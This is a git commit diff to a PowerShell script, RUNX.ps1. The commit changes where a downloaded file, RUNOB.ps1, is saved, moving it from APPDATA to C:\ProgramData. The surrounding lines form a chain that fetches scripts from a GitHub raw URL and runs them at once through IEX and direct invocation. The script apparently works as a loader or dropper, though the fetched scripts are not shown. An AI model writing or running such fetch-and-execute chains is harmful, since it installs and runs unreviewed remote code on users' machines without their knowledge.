a65ec7698a31cee45833e09e08c05f6858a5c3a6
cia168168 <147810144+cia168168@users.noreply.github.com>
2023-11-15 23:43:15 +0700

    Update RUNX.ps1

--- RUNX.ps1
+++ RUNX.ps1
@@ -6,7 +6,7 @@ $output5 = "$env:TEMP\RUNS.ps1"
 Invoke-WebRequest -Uri $url5 -OutFile $output5
 IEX ((New-Object Net.WebClient).DownloadString($output5))
 $url7 = "https://raw.githubusercontent.com/cia168168/folder/main/RUNOB.ps1"
-$output7 = "$env:APPDATA\RUNOB.ps1"
+$output7 = "C:\ProgramData\RUNOB.ps1"
 Invoke-WebRequest -Uri $url7 -OutFile $output7
 & $output7
 
